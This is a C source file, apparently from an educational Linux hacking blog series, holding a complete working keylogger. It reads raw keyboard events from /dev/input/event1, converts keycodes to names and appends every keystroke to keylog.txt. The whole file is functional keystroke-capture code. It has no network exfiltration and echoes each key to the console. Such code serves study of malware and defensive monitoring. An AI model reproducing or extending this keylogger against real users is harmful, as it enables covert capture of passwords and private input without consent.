/*
 * hack2.c
 * simple linux keylogger
 * save to file (key strings)
 * author @cocomelonc
 * https://cocomelonc.github.io/linux/2025/06/03/linux-hacking-5.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>

const char *keycode_to_string(unsigned int code) {
  switch (code) {
    case KEY_ESC: return "ESC";
    case KEY_1: return "1";
    case KEY_2: return "2";
    case KEY_3: return "3";
    case KEY_4: return "4";
    case KEY_5: return "5";
    case KEY_6: return "6";
    case KEY_7: return "7";
    case KEY_8: return "8";
    case KEY_9: return "9";
    case KEY_0: return "0";
    case KEY_Q: return "Q";
    case KEY_W: return "W";
    case KEY_E: return "E";
    case KEY_R: return "R";
    case KEY_T: return "T";
    case KEY_Y: return "Y";
    case KEY_U: return "U";
    case KEY_I: return "I";
    case KEY_O: return "O";
    case KEY_P: return "P";
    case KEY_A: return "A";
    case KEY_S: return "S";
    case KEY_D: return "D";
    case KEY_F: return "F";
    case KEY_G: return "G";
    case KEY_H: return "H";
    case KEY_J: return "J";
    case KEY_K: return "K";
    case KEY_L: return "L";
    case KEY_Z: return "Z";
    case KEY_X: return "X";
    case KEY_C: return "C";
    case KEY_V: return "V";
    case KEY_B: return "B";
    case KEY_N: return "N";
    case KEY_M: return "M";
    case KEY_SPACE: return "SPACE";
    case KEY_ENTER: return "ENTER";
    case KEY_BACKSPACE: return "BACKSPACE";
    case KEY_TAB: return "TAB";
    case KEY_LEFTSHIFT: return "LEFTSHIFT";
    case KEY_RIGHTSHIFT: return "RIGHTSHIFT";
    case KEY_LEFTCTRL: return "LEFTCTRL";
    case KEY_RIGHTCTRL: return "RIGHTCTRL";
    case KEY_F1: return "F1";
    case KEY_F2: return "F2";
    default: return "UNKNOWN";
  }
}

int main(int argc, char *argv[]) {
  const char *dev = "/dev/input/event1"; // in my case event1
  struct input_event ev;
  FILE *logfile = fopen("keylog.txt", "a");
  if (!logfile) {
    perror("fopen");
    return 1;
  }

  int fd = open(dev, O_RDONLY);
  if (fd < 0) {
    perror("open");
    fclose(logfile);
    return 1;
  }
  printf("keylogger started. press ESC to exit.\n");
  while (1) {
    ssize_t n = read(fd, &ev, sizeof(struct input_event));
    if (n == (ssize_t)sizeof(struct input_event)) {
      if (ev.type == EV_KEY && ev.value == 1) { // keydown
        const char *keyname = keycode_to_string(ev.code);
        printf("key pressed: %s (code %d)\n", keyname, ev.code);
        fprintf(logfile, "%s\n", keyname);
        fflush(logfile);
        if (ev.code == KEY_ESC) {
          printf("ESC pressed, exiting.\n");
          break;
        }
      }
    }
  }

  close(fd);
  fclose(logfile);
  return 0;
}
